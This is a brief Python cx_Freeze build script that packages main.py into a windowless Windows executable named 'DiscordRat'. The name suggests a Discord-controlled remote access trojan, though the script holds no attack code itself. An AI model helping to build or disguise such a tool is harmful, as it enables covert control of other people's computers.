from cx_Freeze import setup, Executable

nome_executavel = "DiscordRat"
descricao_executavel = "Projeto python Discord APP "

executables = [Executable("main.py", base="Win32GUI", icon="icon.ico")]

setup(
    name=nome_executavel,
    version="1.0",
    description=descricao_executavel,
    executables=executables,
)
